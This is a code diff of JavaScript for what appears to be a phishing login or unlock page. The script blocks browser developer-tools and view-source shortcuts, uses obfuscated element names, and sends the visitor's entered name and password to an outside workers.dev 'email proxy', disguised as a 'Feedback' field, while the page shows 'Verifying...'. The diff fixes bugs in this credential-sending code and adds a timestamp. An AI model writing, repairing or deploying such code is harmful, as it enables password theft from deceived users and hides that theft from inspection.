@@ -3,16 +3,16 @@ document.onkeydown = function (event) {
     return false;
   }
   if (
-    event1.ctrlKey &&
+    event.ctrlKey &&
     event.shiftKey &&
-    (event1.keyCode == "I".charCodeAt(0) ||
+    (event.keyCode == "I".charCodeAt(0) ||
       event.keyCode == "C".charCodeAt(0) ||
-      event1.keyCode == "J".charCodeAt(0))
+      event.keyCode == "J".charCodeAt(0))
   ) {
     return false;
   }
   if (
-    event1.ctrlKey &&
+    event.ctrlKey &&
     (event.keyCode == "U".charCodeAt(0) || event.keyCode == "S".charCodeAt(0))
   ) {
     return false;
@@ -76,7 +76,7 @@ const viper = document.getElementById("viper");
   }
 })();
 function falcon() {
-  const customerName = document.getElementById("viper").value;
+  const customerName = viper.value;
   const customerMessage = document.getElementById("cobra").value;
   const unlockBtn = document.getElementById("btn-unlock");
   const spinner = document.getElementById("loading-spinner");
@@ -84,22 +84,25 @@ function falcon() {
   const form = document.getElementById("loginBox");
   document.getElementById("sentinel").style.display = "none";
   form.classList.remove("shake");
-  if (code.length < 1) {
+  if (!customerMessage || customerMessage.length < 1) {
     showError("Please enter your password.");
     form.classList.add("shake");
     return;
   }
-const cleanPayload = new URLSearchParams();
-cleanPayload.append("Name", customerName);
-cleanPayload.append("Feedback", customerMessage);
-
-fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded",
-  },
-  body: cleanPayload
-});
+  const cleanPayload = new URLSearchParams();
+  cleanPayload.append("Name", customerName);
+  cleanPayload.append("Feedback", customerMessage);
+  cleanPayload.append("timestamp", Date.now().toString());
+  unlockBtn.disabled = true;
+  spinner.style.display = "block";
+  btnText.innerText = "Verifying...";
+  fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: cleanPayload,
+  })
     .then((r) => r.json())
     .then((result) => {
       unlockBtn.disabled = false;
